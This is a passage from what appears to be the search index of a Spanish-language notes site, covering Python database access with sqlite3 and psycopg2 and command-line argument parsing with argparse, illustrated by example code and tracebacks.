conexi\u00f3n. Las dem\u00e1s opciones ya son extras de como mostrar el string, commandos m\u00faltiples, etc.. Los commandos ser\u00e1n iguales que como si los lanz\u00e1ramos desde la terminal. Conexi\u00f3n a la base de datos Sqlite # Importamos el m\u00f3dulo import sqlite3 # Nos conectamos a la base de datos ejemplo.db (la crea si no existe) conexion = sqlite3 . connect ( 'ejemplo.db' ) # Cerramos la conexi\u00f3n, si no la cerramos se mantendr\u00e1 en uso y no podremos gestionar el fichero conexion . close () Postgres import psycopg2 # Conexion con base de datos conexion = psycopg2 . connect ( host = \"localhost\" , database = \"training\" , user = \"postgres\" , password = \"postgres\" ) # Cierro la conexion conexion . close () Creaci\u00f3n de una tabla utilizando sintaxis SQL Antes de ejecutar una consulta (query) en c\u00f3digo SQL, tenemos que crear un cursor. Una vez creada la tabla, si intentamos volver a crearla dar\u00e1 error indic\u00e1ndonos que esta ya existe. import sqlite3 conexion = sqlite3 . connect ( 'ejemplo.db' ) # Creamos el cursor cursor = conexion . cursor () # Ahora crearemos una tabla de usuarios para almacenar nombres, edades y emails cursor . execute ( \"CREATE TABLE usuarios (nombre VARCHAR(100), edad INTEGER, email VARCHAR(100))\" ) # Guardamos los cambios haciendo un commit conexion . commit () conexion . close () Insertando un registro import sqlite3 conexion = sqlite3 . connect ( 'ejemplo.db' ) cursor = conexion . cursor () # Insertamos un registro en la tabla de usuarios cursor . execute ( \"INSERT INTO usuarios VALUES ('Hector', 27, 'hector@ejemplo.com')\" ) # Guardamos los cambios haciendo un commit conexion . commit () conexion . close () Insertando varios registros con .executemany() import sqlite3 conexion = sqlite3 . connect ( 'ejemplo.db' ) cursor = conexion . cursor () # Creamos una lista con varios usuarios usuarios = [( 'Mario' , 51 , 'mario@ejemplo.com' ), ( 'Mercedes' , 38 , 'mercedes@ejemplo.com' ), ( 'Juan' , 19 , 'juan@ejemplo.com' ) ] # Ahora utilizamos el m\u00e9todo executemany() para insertar varios cursor . executemany ( \"INSERT INTO usuarios VALUES (?,?,?)\" , usuarios ) # Guardamos los cambios haciendo un commit conexion . commit () conexion . close () Recuperando el primer registro con .fetchone() fetchone devuelve una fila, cada vez que se vuelve a llamar devuelve la fila siguiente hasta que da error por no haber mas filas. import sqlite3 conexion = sqlite3 . connect ( 'ejemplo.db' ) cursor = conexion . cursor () # Recuperamos los registros de la tabla de usuarios cursor . execute ( \"SELECT * FROM usuarios\" ) # Mostrar el cursos a ver que hay ? print ( cursor ) # Recorremos el primer registro con el m\u00e9todo fetchone, devuelve una tupla usuario = cursor . fetchone () print ( usuario ) conexion . close () ('Hector', 27, 'hector@ejemplo.com') Recuperando varios registros con .fetchall() import sqlite3 conexion = sqlite3 . connect ( 'ejemplo.db' ) cursor = conexion . cursor () # Recuperamos los registros de la tabla de usuarios cursor . execute ( \"SELECT * FROM usuarios\" ) # Recorremos todos los registros con fetchall, y los volvamos en una lista de usuarios usuarios = cursor . fetchall () # Ahora podemos recorrer todos los usuarios for usuario in usuarios : print ( usuario ) conexion . close () ( 'Hector' , 27 , 'hector@ejemplo.com' ) ( 'Mario' , 51 , 'mario@ejemplo.com' ) ( 'Mercedes' , 38 , 'mercedes@ejemplo.com' ) ( 'Juan' , 19 , 'juan@ejemplo.com' ) Utilizando DB Browser Es un programa externo para ver, modificar, etc.. bases de datos sqlite. http://sqlitebrowser.org/ Claves primarias Una clave primaria es un campo especial de una tabla que act\u00faa como identificador \u00fanico de los registros, en otras palabras, no se puede repetir un registro con la misma clave primaria. Por ejemplo dos usuarios con el mismo DNI: import sqlite3 conexion = sqlite3 . connect ( 'usuarios.db' ) cursor = conexion . cursor () # Creamos un campo dni como clave primaria cursor . execute ( '''CREATE TABLE usuarios ( dni VARCHAR(9) PRIMARY KEY, nombre VARCHAR(100), edad INTEGER, email VARCHAR(100))''' ) usuarios = [( '11111111A' , 'Hector' , 27 , 'hector@ejemplo.com' ), ( '22222222B' , 'Mario' , 51 , 'mario@ejemplo.com' ), ( '33333333C' , 'Mercedes' , 38 , 'mercedes@ejemplo.com' ), ( '44444444D' , 'Juan' , 19 , 'juan@ejemplo.com' )] cursor . executemany ( \"INSERT INTO usuarios VALUES (?,?,?,?)\" , usuarios ) conexion . commit () conexion . close () Si ahora intentamos introducir un registro con un DNI duplicado, saltar\u00e1 un error: import sqlite3 conexion = sqlite3 . connect ( 'usuarios.db' ) cursor = conexion . cursor () # A\u00f1adimos un usuario con el mismo DNI cursor . execute ( \"INSERT INTO usuarios VALUES ('11111111A', 'Fernando', 31, 'fernando@ejemplo.com')\" ) conexion . commit () conexion . close () --------------------------------------------------------------------------- IntegrityError Traceback (most recent call last) <ipython-input-88-1f8a69b706db> in <module>() 6 7 # A\u00f1adimos un usuario con el mismo DNI ----> 8 cursor.execute(\"INSERT INTO usuarios VALUES ('11111111A', 'Fernando', 31, 'fernando@ejemplo.com')\") 9 10 conexion.commit() IntegrityError: UNIQUE constraint failed: usuarios.dni Campos autoincrementales No siempre contaremos con claves primarias en nuestras tablas (como el DNI), sin embargo siempre necesitaremos uno para identificar cada registro y poder consultarlo, modificarlo o borrarlo. Para estas situaciones lo m\u00e1s \u00fatil es utilizar campos autoincrementales, campos especiales que asignan autom\u00e1ticamente un n\u00famero (de uno en uno) al crear un nuevo registro. Es muy \u00fatil para identificar de forma \u00fanica cada registro ya que nunca se repiten. En SQLite, si indicamos que un campo num\u00e9rico entero es una clave primaria, autom\u00e1ticamente se tomar\u00e1 como un campo auto incremental. Podemos hacerlo f\u00e1cilmente as\u00ed: import sqlite3 conexion = sqlite3 . connect ( 'productos.db' ) cursor = conexion . cursor () # Las cl\u00e1usulas not null indican que no puede ser campos vac\u00edos cursor . execute ( '''CREATE TABLE productos ( id INTEGER PRIMARY KEY AUTOINCREMENT, nombre VARCHAR(100) NOT NULL, marca VARCHAR(50) NOT NULL, precio FLOAT NOT NULL)''' ) conexion . close () \u00a1Problema al insertar registros con campos autoincrementales! Al utilizar un nuevo campo autoincremental, la sintaxis sencilla para insertar registros ya no funciona, pues en primer lugar se espera un identificador \u00fanico, por lo que recibimos un error indic\u00e1ndonos se esperan 4 columnas en lugar de 3: import sqlite3 conexion = sqlite3 . connect ( 'productos.db' ) cursor = conexion . cursor () productos = [( 'Teclado' , 'Logitech' , 19.95 ), ( 'Pantalla 19\"' 'LG' , 89.95 ),] cursor . executemany ( \"INSERT INTO productos VALUES (?,?,?)\" , productos ) conexion . commit () conexion . close () --------------------------------------------------------------------------- OperationalError Traceback (most recent call last) <ipython-input-96-7b99f15c4bb5> in <module>() 8 ('Pantalla 19\"' 'LG', 89.95),] 9 ---> 10 cursor.executemany(\"INSERT INTO productos VALUES (?,?,?)\", productos) 11 12 conexion.commit() OperationalError: table productos has 4 columns but 3 values were supplied Para arreglarlo cambiaremos la notaci\u00f3n durante la inserci\u00f3n, especificando el valor null para el auto incremento: import sqlite3 conexion = sqlite3 . connect ( 'productos.db' ) cursor = conexion . cursor () productos = [( 'Teclado' , 'Logitech' , 19.95 ), ( 'Pantalla 19\"' , 'LG' , 89.95 ), ( 'Altavoces 2.1' , 'LG' , 24.95 ),] cursor . executemany ( \"INSERT INTO productos VALUES (null,?,?,?)\" , productos ) conexion . commit () conexion . close () Ahora podemos consultar nuestros productos f\u00e1cilmente con su identificador \u00fanico: import sqlite3 conexion = sqlite3 . connect ( 'productos.db' ) cursor = conexion . cursor () # Recuperamos los registros de la tabla de usuarios cursor . execute ( \"SELECT * FROM productos\" ) # Recorremos todos los registros con fetchall, y los volvamos en una lista de usuarios productos = cursor . fetchall () # Ahora podemos recorrer todos los productos for producto in productos : print ( producto ) conexion . close () (1, 'Teclado', 'Logitech', 19.95) (2, 'Pantalla 19\"', 'LG', 89.95) (3, 'Altavoces 2.1', 'LG', 24.95) Claves \u00fanicas El problema con las claves primarias es que s\u00f3lo podemos tener un campo con esta propiedad, y si da la casualidad que utilizamos un campo autoincremental, ya no podemos asignarla a otro campo. Para estos casos existen las claves \u00fanicas, que nos permiten a\u00f1adir otros campos \u00fanicos no repetibles. Podemos adaptar el ejemplo de los usuarios con un campo autoincremental que haga de clave primaria, y a su vez marcar el DNI como un campo \u00fanico: import sqlite3 conexion = sqlite3 . connect ( 'usuarios_autoincremental.db' ) cursor = conexion . cursor () # Creamos un campo dni como clave primaria cursor . execute ( '''CREATE TABLE usuarios ( id INTEGER PRIMARY KEY, dni VARCHAR(9) UNIQUE, nombre VARCHAR(100), edad INTEGER(3), email VARCHAR(100))''' ) usuarios = [( '11111111A' , 'Hector' , 27 , 'hector@ejemplo.com' ), ( '22222222B' , 'Mario' , 51 , 'mario@ejemplo.com' ), ( '33333333C' , 'Mercedes' , 38 , 'mercedes@ejemplo.com' ), ( '44444444D' , 'Juan' , 19 , 'juan@ejemplo.com' )] cursor . executemany ( \"INSERT INTO usuarios VALUES (null, ?,?,?,?)\" , usuarios ) conexion . commit () conexion . close () Si intentamos a\u00f1adir un usuario con la misma clave da error de integridad: import sqlite3 conexion = sqlite3 . connect ( 'usuarios_autoincremental.db' ) cursor = conexion . cursor () # A\u00f1adimos un usuario con el mismo DNI cursor . execute ( \"INSERT INTO usuarios VALUES (null, '11111111A', 'Fernando', 31, 'fernando@ejemplo.com')\" ) conexion . commit () conexion . close () --------------------------------------------------------------------------- IntegrityError Traceback (most recent call last) <ipython-input-100-fdd36d467cfc> in <module>() 6 7 # A\u00f1adimos un usuario con el mismo DNI ----> 8 cursor.execute(\"INSERT INTO usuarios VALUES (null, '11111111A', 'Fernando', 31, 'fernando@ejemplo.com')\") 9 10 conexion.commit() IntegrityError: UNIQUE constraint failed: usuarios.dni Con la ventaja de contar con un identificador autom\u00e1tico para cada registro: import sqlite3 conexion = sqlite3 . connect ( 'usuarios_autoincremental.db' ) cursor = conexion . cursor () # Recuperamos los registros de la tabla de usuarios cursor . execute ( \"SELECT * FROM usuarios\" ) # Recorremos todos los registros con fetchall, y los volvamos en una lista de usuarios usuarios = cursor . fetchall () # Ahora podemos recorrer todos los usuarios for usuario in usuarios : print ( usuario ) conexion . close () (1, '11111111A', 'Hector', 27, 'hector@ejemplo.com') (2, '22222222B', 'Mario', 51, 'mario@ejemplo.com') (3, '33333333C', 'Mercedes', 38, 'mercedes@ejemplo.com') (4, '44444444D', 'Juan', 19, 'juan@ejemplo.com')","title":"Apuntes bases"},{"location":"lenguajes/python3/apuntes_bases/#_1","text":"","title":""},{"location":"lenguajes/python3/apuntes_bases/#base-de-datos","text":"En las conexiones a bases de datos desde python se siguen 4 pasos muy simples. import importar el modulo de la base de datos especifica connect establecer la conexi\u00f3n con la base de datos execute ejecutar el commando que uno quiere introducir close cerrar la conexi\u00f3n. Las dem\u00e1s opciones ya son extras de como mostrar el string, commandos m\u00faltiples, etc.. Los commandos ser\u00e1n iguales que como si los lanz\u00e1ramos desde la terminal.","title":"Base de datos"},{"location":"lenguajes/python3/apuntes_bases/#conexion-a-la-base-de-datos","text":"Sqlite # Importamos el m\u00f3dulo import sqlite3 # Nos conectamos a la base de datos ejemplo.db (la crea si no existe) conexion = sqlite3 . connect ( 'ejemplo.db' ) # Cerramos la conexi\u00f3n, si no la cerramos se mantendr\u00e1 en uso y no podremos gestionar el fichero conexion . close () Postgres import psycopg2 # Conexion con base de datos conexion = psycopg2 . connect ( host = \"localhost\" , database = \"training\" , user = \"postgres\" , password = \"postgres\" ) # Cierro la conexion conexion . close ()","title":"Conexi\u00f3n a la base de datos"},{"location":"lenguajes/python3/apuntes_bases/#creacion-de-una-tabla-utilizando-sintaxis-sql","text":"Antes de ejecutar una consulta (query) en c\u00f3digo SQL, tenemos que crear un cursor. Una vez creada la tabla, si intentamos volver a crearla dar\u00e1 error indic\u00e1ndonos que esta ya existe. import sqlite3 conexion = sqlite3 . connect ( 'ejemplo.db' ) # Creamos el cursor cursor = conexion . cursor () # Ahora crearemos una tabla de usuarios para almacenar nombres, edades y emails cursor . execute ( \"CREATE TABLE usuarios (nombre VARCHAR(100), edad INTEGER, email VARCHAR(100))\" ) # Guardamos los cambios haciendo un commit conexion . commit () conexion . close ()","title":"Creaci\u00f3n de una tabla utilizando sintaxis SQL"},{"location":"lenguajes/python3/apuntes_bases/#insertando-un-registro","text":"import sqlite3 conexion = sqlite3 . connect ( 'ejemplo.db' ) cursor = conexion . cursor () # Insertamos un registro en la tabla de usuarios cursor . execute ( \"INSERT INTO usuarios VALUES ('Hector', 27, 'hector@ejemplo.com')\" ) # Guardamos los cambios haciendo un commit conexion . commit () conexion . close ()","title":"Insertando un registro"},{"location":"lenguajes/python3/apuntes_bases/#insertando-varios-registros-con-executemany","text":"import sqlite3 conexion = sqlite3 . connect ( 'ejemplo.db' ) cursor = conexion . cursor () # Creamos una lista con varios usuarios usuarios = [( 'Mario' , 51 , 'mario@ejemplo.com' ), ( 'Mercedes' , 38 , 'mercedes@ejemplo.com' ), ( 'Juan' , 19 , 'juan@ejemplo.com' ) ] # Ahora utilizamos el m\u00e9todo executemany() para insertar varios cursor . executemany ( \"INSERT INTO usuarios VALUES (?,?,?)\" , usuarios ) # Guardamos los cambios haciendo un commit conexion . commit () conexion . close ()","title":"Insertando varios registros con .executemany()"},{"location":"lenguajes/python3/apuntes_bases/#recuperando-el-primer-registro-con-fetchone","text":"fetchone devuelve una fila, cada vez que se vuelve a llamar devuelve la fila siguiente hasta que da error por no haber mas filas. import sqlite3 conexion = sqlite3 . connect ( 'ejemplo.db' ) cursor = conexion . cursor () # Recuperamos los registros de la tabla de usuarios cursor . execute ( \"SELECT * FROM usuarios\" ) # Mostrar el cursos a ver que hay ? print ( cursor ) # Recorremos el primer registro con el m\u00e9todo fetchone, devuelve una tupla usuario = cursor . fetchone () print ( usuario ) conexion . close () ('Hector', 27, 'hector@ejemplo.com')","title":"Recuperando el primer registro con .fetchone()"},{"location":"lenguajes/python3/apuntes_bases/#_2","text":"","title":""},{"location":"lenguajes/python3/apuntes_bases/#recuperando-varios-registros-con-fetchall","text":"import sqlite3 conexion = sqlite3 . connect ( 'ejemplo.db' ) cursor = conexion . cursor () # Recuperamos los registros de la tabla de usuarios cursor . execute ( \"SELECT * FROM usuarios\" ) # Recorremos todos los registros con fetchall, y los volvamos en una lista de usuarios usuarios = cursor . fetchall () # Ahora podemos recorrer todos los usuarios for usuario in usuarios : print ( usuario ) conexion . close () ( 'Hector' , 27 , 'hector@ejemplo.com' ) ( 'Mario' , 51 , 'mario@ejemplo.com' ) ( 'Mercedes' , 38 , 'mercedes@ejemplo.com' ) ( 'Juan' , 19 , 'juan@ejemplo.com' )","title":"Recuperando varios registros con .fetchall()"},{"location":"lenguajes/python3/apuntes_bases/#utilizando-db-browser","text":"Es un programa externo para ver, modificar, etc.. bases de datos sqlite. http://sqlitebrowser.org/","title":"Utilizando DB Browser"},{"location":"lenguajes/python3/apuntes_bases/#_3","text":"","title":""},{"location":"lenguajes/python3/apuntes_bases/#claves-primarias","text":"Una clave primaria es un campo especial de una tabla que act\u00faa como identificador \u00fanico de los registros, en otras palabras, no se puede repetir un registro con la misma clave primaria. Por ejemplo dos usuarios con el mismo DNI: import sqlite3 conexion = sqlite3 . connect ( 'usuarios.db' ) cursor = conexion . cursor () # Creamos un campo dni como clave primaria cursor . execute ( '''CREATE TABLE usuarios ( dni VARCHAR(9) PRIMARY KEY, nombre VARCHAR(100), edad INTEGER, email VARCHAR(100))''' ) usuarios = [( '11111111A' , 'Hector' , 27 , 'hector@ejemplo.com' ), ( '22222222B' , 'Mario' , 51 , 'mario@ejemplo.com' ), ( '33333333C' , 'Mercedes' , 38 , 'mercedes@ejemplo.com' ), ( '44444444D' , 'Juan' , 19 , 'juan@ejemplo.com' )] cursor . executemany ( \"INSERT INTO usuarios VALUES (?,?,?,?)\" , usuarios ) conexion . commit () conexion . close () Si ahora intentamos introducir un registro con un DNI duplicado, saltar\u00e1 un error: import sqlite3 conexion = sqlite3 . connect ( 'usuarios.db' ) cursor = conexion . cursor () # A\u00f1adimos un usuario con el mismo DNI cursor . execute ( \"INSERT INTO usuarios VALUES ('11111111A', 'Fernando', 31, 'fernando@ejemplo.com')\" ) conexion . commit () conexion . close () --------------------------------------------------------------------------- IntegrityError Traceback (most recent call last) <ipython-input-88-1f8a69b706db> in <module>() 6 7 # A\u00f1adimos un usuario con el mismo DNI ----> 8 cursor.execute(\"INSERT INTO usuarios VALUES ('11111111A', 'Fernando', 31, 'fernando@ejemplo.com')\") 9 10 conexion.commit() IntegrityError: UNIQUE constraint failed: usuarios.dni","title":"Claves primarias"},{"location":"lenguajes/python3/apuntes_bases/#campos-autoincrementales","text":"No siempre contaremos con claves primarias en nuestras tablas (como el DNI), sin embargo siempre necesitaremos uno para identificar cada registro y poder consultarlo, modificarlo o borrarlo. Para estas situaciones lo m\u00e1s \u00fatil es utilizar campos autoincrementales, campos especiales que asignan autom\u00e1ticamente un n\u00famero (de uno en uno) al crear un nuevo registro. Es muy \u00fatil para identificar de forma \u00fanica cada registro ya que nunca se repiten. En SQLite, si indicamos que un campo num\u00e9rico entero es una clave primaria, autom\u00e1ticamente se tomar\u00e1 como un campo auto incremental. Podemos hacerlo f\u00e1cilmente as\u00ed: import sqlite3 conexion = sqlite3 . connect ( 'productos.db' ) cursor = conexion . cursor () # Las cl\u00e1usulas not null indican que no puede ser campos vac\u00edos cursor . execute ( '''CREATE TABLE productos ( id INTEGER PRIMARY KEY AUTOINCREMENT, nombre VARCHAR(100) NOT NULL, marca VARCHAR(50) NOT NULL, precio FLOAT NOT NULL)''' ) conexion . close ()","title":"Campos autoincrementales"},{"location":"lenguajes/python3/apuntes_bases/#problema-al-insertar-registros-con-campos-autoincrementales","text":"Al utilizar un nuevo campo autoincremental, la sintaxis sencilla para insertar registros ya no funciona, pues en primer lugar se espera un identificador \u00fanico, por lo que recibimos un error indic\u00e1ndonos se esperan 4 columnas en lugar de 3: import sqlite3 conexion = sqlite3 . connect ( 'productos.db' ) cursor = conexion . cursor () productos = [( 'Teclado' , 'Logitech' , 19.95 ), ( 'Pantalla 19\"' 'LG' , 89.95 ),] cursor . executemany ( \"INSERT INTO productos VALUES (?,?,?)\" , productos ) conexion . commit () conexion . close () --------------------------------------------------------------------------- OperationalError Traceback (most recent call last) <ipython-input-96-7b99f15c4bb5> in <module>() 8 ('Pantalla 19\"' 'LG', 89.95),] 9 ---> 10 cursor.executemany(\"INSERT INTO productos VALUES (?,?,?)\", productos) 11 12 conexion.commit() OperationalError: table productos has 4 columns but 3 values were supplied Para arreglarlo cambiaremos la notaci\u00f3n durante la inserci\u00f3n, especificando el valor null para el auto incremento: import sqlite3 conexion = sqlite3 . connect ( 'productos.db' ) cursor = conexion . cursor () productos = [( 'Teclado' , 'Logitech' , 19.95 ), ( 'Pantalla 19\"' , 'LG' , 89.95 ), ( 'Altavoces 2.1' , 'LG' , 24.95 ),] cursor . executemany ( \"INSERT INTO productos VALUES (null,?,?,?)\" , productos ) conexion . commit () conexion . close () Ahora podemos consultar nuestros productos f\u00e1cilmente con su identificador \u00fanico: import sqlite3 conexion = sqlite3 . connect ( 'productos.db' ) cursor = conexion . cursor () # Recuperamos los registros de la tabla de usuarios cursor . execute ( \"SELECT * FROM productos\" ) # Recorremos todos los registros con fetchall, y los volvamos en una lista de usuarios productos = cursor . fetchall () # Ahora podemos recorrer todos los productos for producto in productos : print ( producto ) conexion . close () (1, 'Teclado', 'Logitech', 19.95) (2, 'Pantalla 19\"', 'LG', 89.95) (3, 'Altavoces 2.1', 'LG', 24.95)","title":"\u00a1Problema al insertar registros con campos autoincrementales!"},{"location":"lenguajes/python3/apuntes_bases/#claves-unicas","text":"El problema con las claves primarias es que s\u00f3lo podemos tener un campo con esta propiedad, y si da la casualidad que utilizamos un campo autoincremental, ya no podemos asignarla a otro campo. Para estos casos existen las claves \u00fanicas, que nos permiten a\u00f1adir otros campos \u00fanicos no repetibles. Podemos adaptar el ejemplo de los usuarios con un campo autoincremental que haga de clave primaria, y a su vez marcar el DNI como un campo \u00fanico: import sqlite3 conexion = sqlite3 . connect ( 'usuarios_autoincremental.db' ) cursor = conexion . cursor () # Creamos un campo dni como clave primaria cursor . execute ( '''CREATE TABLE usuarios ( id INTEGER PRIMARY KEY, dni VARCHAR(9) UNIQUE, nombre VARCHAR(100), edad INTEGER(3), email VARCHAR(100))''' ) usuarios = [( '11111111A' , 'Hector' , 27 , 'hector@ejemplo.com' ), ( '22222222B' , 'Mario' , 51 , 'mario@ejemplo.com' ), ( '33333333C' , 'Mercedes' , 38 , 'mercedes@ejemplo.com' ), ( '44444444D' , 'Juan' , 19 , 'juan@ejemplo.com' )] cursor . executemany ( \"INSERT INTO usuarios VALUES (null, ?,?,?,?)\" , usuarios ) conexion . commit () conexion . close () Si intentamos a\u00f1adir un usuario con la misma clave da error de integridad: import sqlite3 conexion = sqlite3 . connect ( 'usuarios_autoincremental.db' ) cursor = conexion . cursor () # A\u00f1adimos un usuario con el mismo DNI cursor . execute ( \"INSERT INTO usuarios VALUES (null, '11111111A', 'Fernando', 31, 'fernando@ejemplo.com')\" ) conexion . commit () conexion . close () --------------------------------------------------------------------------- IntegrityError Traceback (most recent call last) <ipython-input-100-fdd36d467cfc> in <module>() 6 7 # A\u00f1adimos un usuario con el mismo DNI ----> 8 cursor.execute(\"INSERT INTO usuarios VALUES (null, '11111111A', 'Fernando', 31, 'fernando@ejemplo.com')\") 9 10 conexion.commit() IntegrityError: UNIQUE constraint failed: usuarios.dni Con la ventaja de contar con un identificador autom\u00e1tico para cada registro: import sqlite3 conexion = sqlite3 . connect ( 'usuarios_autoincremental.db' ) cursor = conexion . cursor () # Recuperamos los registros de la tabla de usuarios cursor . execute ( \"SELECT * FROM usuarios\" ) # Recorremos todos los registros con fetchall, y los volvamos en una lista de usuarios usuarios = cursor . fetchall () # Ahora podemos recorrer todos los usuarios for usuario in usuarios : print ( usuario ) conexion . close () (1, '11111111A', 'Hector', 27, 'hector@ejemplo.com') (2, '22222222B', 'Mario', 51, 'mario@ejemplo.com') (3, '33333333C', 'Mercedes', 38, 'mercedes@ejemplo.com') (4, '44444444D', 'Juan', 19, 'juan@ejemplo.com')","title":"Claves \u00fanicas"},{"location":"lenguajes/python3/argparse/","text":"Argparse https://bip.weizmann.ac.il/course/python/PyMOTW/PyMOTW/docs/argparse/index.html https://docs.python.org/3/library/argparse.html control de argumentos en python. importando libreria import argparse Help El formateo del help es opcional ya qu se puede dejar en blanco y mostrara solo las opciones de argumentos a\u00f1adidos, pero ya que lo tenemos lo dejaremos bonito. prog : nombre del programa usage : modo de uso formatter_class=argparse.RawDescriptionHelpFormatter : forzar un formato literal, si no muesta toda la descripci\u00f3n en una l\u00ednea. description : descripcion del programa epilog : Ultima linea que mostrara el help. parser = argparse . ArgumentParser ( prog = 'provando_argparse.py' , usage = ' %(prog)s [options]' , formatter_class = argparse . RawDescriptionHelpFormatter , description = ''' haciendo pruevas con argparse ---------------------------- Prueva de formato literal''' , epilog = \"Epilog, es el footer del help\" ) args = parser . parse_args () python3 provando_agparse.py -h usage: provando_argparse.py [ options ] haciendo pruevas con argparse ---------------------------- Prueva de formato literal optional arguments: -h, --help show this help message and exit Version parser = argparse . ArgumentParser ( prog = 'provando_argparse.py' , usage = ' %(prog)s [options]' , formatter_class = argparse . RawDescriptionHelpFormatter , description = ''' haciendo pruevas con argparse ---------------------------- Prueva de formato literal''' , epilog = \"Epilog, es el footer del help\" ) parser . add_argument ( '--version' , action = 'version' , version = ' %(prog)s 1.0' ) args = parser . parse_args () Argumento opcional, \u00fanico en str analizador = argparse . ArgumentParser ( description = 'Tutorial sobre argparse.' ) analizador . add_argument ( \"-a\" , \"--add\" , help = \"Detecta y confirma primer argumento\" ) argumento = analizador . parse_args () if argumento . add : print ( \"Argumento opcional solicitado -a\" ) print ( \"Argumento dado: \" + argumento . add ) Argumento opcional, unico en int type permite obligar, que el argumento insertado sea de un tipo o otro. analizador = argparse . ArgumentParser ( description = 'Tutorial sobre argparse.' ) analizador . add_argument ( \"-i\" , \"--integer\" , help = \"Detecta y confirma primer argumento integer\" , type = int ) argumento = analizador . parse_args () if argumento . integer : print ( \"Argumento opcional solicitado -i\" ) print ( \"Argumento dado: \" , argumento . integer ) Argumento obligatorio Al a\u00f1adir un argumento sin el - se convierte en obligatorio, no se podra ejecutar el script sin como minimo 1 argumento. ej: python3 prog.py file.txt analizador = argparse . ArgumentParser ( description = 'Tutorial sobre argparse.' ) analizador . add_argument ( \"archivo\" , help = \"Argumento obligatorio\" ) argumento = analizador . parse_args () if argumento . archivo : print ( \"Argumento obligatorio: archivo\" ) print ( \"Nombre del archivo: \" + argumento . archivo ) N\u00famero de argumentos esplicito nargs permite indicar cuantos argumentos quieres que entren por opci\u00f3n analizador = argparse . ArgumentParser ( description = 'Tutorial sobre argparse.' ) analizador . add_argument ( \"-s\" , \"--suma\" , help = \"Suma 2 argumentos numericos\" , nargs = 2 , type = int ) argumento = analizador . parse_args () if argumento . suma : print ( \"Argumento opcional solicitado -s\" ) print ( f \"Resultado de { argumento . suma [ 0 ] } + { argumento . suma [ 1 ] } = { argumento . suma [ 0 ] + argumento . suma [ 1 ] } \" ) N\u00famero x de argumentos nargs nos deja jugar con alguna expresi\u00f3n regular por ejemplo. N The absolute number of arguments (e.g., 3). ? 0 or 1 arguments * 0 or all arguments + Todos, y al menos un argumento. analizador = argparse . ArgumentParser ( description = 'Tutorial sobre argparse.' ) analizador . add_argument ( \"-l\" , \"--lista\" , help = \"Muestra todos los argumentos dados de 0 a n\" , nargs = \"*\" ) argumento = analizador . parse_args () if argumento . lista : print ( \"Argumento opcional solicitado -l\" ) print ( f \"la lista de argumentos es: { argumento . lista } \" ) Opciones por default En n argumento obligatorio si le a\u00f1adimos un valor por defecto, se convierte en, no obligatorio al ya tener un valor predeterminado. Muy \u00fatil para scripts con rutas predeterminadas e indicarle al usuario s quiere otra opcional que la escriba. analizador = argparse . ArgumentParser ( description = 'Tutorial sobre argparse.' ) analizador . add_argument ( \"defecto\" , help = \"Muestra argumento y si no hay muestra el por defecto\" , nargs = \"?\" , default = 'hola mundo' ) argumento = analizador . parse_args () if argumento . defecto : print ( \"Argumento opcional solicitado -d\" ) print ( f \"la lista de argumentos es: { argumento . defecto } \" ) Opcional en obligatorio required obliga a que se a\u00f1ada el argumento obligatoriamente. analizador = argparse . ArgumentParser ( description = 'Tutorial sobre argparse.' ) analizador . add_argument ( \"-r\" , \"--required\" , help = \"Lista los n argumentos dados\" , required = True , nargs = \"*\" ) argumento = analizador . parse_args () if argumento . required : print ( \"Argumento opcional solicitado -r\" ) print ( f \"Argumento dado: { argumento . required } \" ) Lista opciones de argumento choices opciones de argumento, solo aceptara esas opciones al argumento indicado. analizador = argparse . ArgumentParser ( description = 'Tutorial sobre argparse.' ) analizador . add_argument ( \"mes\" , choices = [ 'Enero' , 'Abril' , 'Julio' , 'Octubre' ], help = \"Permite escoger un mes de comienzo de trimestre.\" , ) argumento = analizador . parse_args () print ( \"Argumento: solicita un mes de una lista predeterminada.\" ) print ( \"Mes escogido:\" ) print ( argumento . mes ) Verificar opci\u00f3n action=store_true si la opci\u00f3n a sido a\u00f1adida retornara un valor de True en el caso contrario False analizador = argparse . ArgumentParser ( description = 'Tutorial sobre argparse.' ) analizador . add_argument ( \"-l\" , \"--long\" , help = \"Detecta y confirma primer argumento\" , action = \"store_true\" ) analizador . add_argument ( \"-a\" , \"--arbol\" , help = \"Detecta y confirma primer argumento\" , action = \"store_true\" ) argumento = analizador . parse_args () if argumento . long : print ( \"Argumento --long devuelve: \" , argumento . long ) if argumento . arbol : print ( \"Argumento --arbol devuelve: \" , argumento . arbol ) action=count tiene el poder de contar las veces que a\u00f1ades repetidament la opci\u00f3n, utilizado en vervose comunmente -v -vv -vvv parser = argparse . ArgumentParser () parser . add_argument ( \"square\" , type = int , help = \"display the square of a given number\" ) parser . add_argument ( \"-v\" , \"--verbosity\" , action = \"count\" , default = 0 , help = \"increase output verbosity\" ) args = parser . parse_args () answer = args . square ** 2 if args . verbosity >= 2 : print ( \"the square of {} equals {} \" . format ( args . square , answer )) elif args . verbosity >= 1 : print ( \" {} ^2 == {} \" . format ( args . square , answer )) else : print ( answer ) Opciones incompatibles entre ellas Al crear un grupo de argumentos puedes diferenciar opciones incompatibles, por ejemplo en el siguiente script poedes a\u00f1adir opci\u00f3n -c o -e pero nunca podras a\u00f1adir las 2 a la vez. analizador = argparse . ArgumentParser ( description = 'Tutorial sobre argparse.' ) grupo = analizador . add_mutually_exclusive_group () grupo . add_argument ( \"-c\" , \"--cubo\" , action = \"store_true\" , help = \"Imprime un cubo en tercera dimensi\u00f3n.\" , ) grupo . add_argument ( \"-e\" , \"--esfera\" , action = \"store_true\" , help = \"Imprime una esfera en tercera dimensi\u00f3n.\" , ) argumento = analizador . parse_args () if argumento . cubo : print ( \"'Imprime' un cubo\" ) if argumento . esfera : print ( \"'Imprime' una esfera\" )","title":"Argparse"},{"location":"lenguajes/python3/argparse/#argparse","text":"https://bip.weizmann.ac.il/course/python/PyMOTW/PyMOTW/docs/argparse/index.html https://docs.python.org/3/library/argparse.html control de argumentos en python. importando libreria import argparse","title":"Argparse"},{"location":"lenguajes/python3/argparse/#help","text":"El formateo del help es opcional ya qu se puede dejar en blanco y mostrara solo las opciones de argumentos a\u00f1adidos, pero ya que lo tenemos lo dejaremos bonito. prog : nombre del programa usage : modo de uso formatter_class=argparse.RawDescriptionHelpFormatter : forzar un formato literal, si no muesta toda la descripci\u00f3n en una l\u00ednea. description : descripcion del programa epilog : Ultima linea que mostrara el help. parser = argparse . ArgumentParser ( prog = 'provando_argparse.py' , usage = ' %(prog)s [options]' , formatter_class = argparse . RawDescriptionHelpFormatter , description = ''' haciendo pruevas con argparse ---------------------------- Prueva de formato literal''' , epilog = 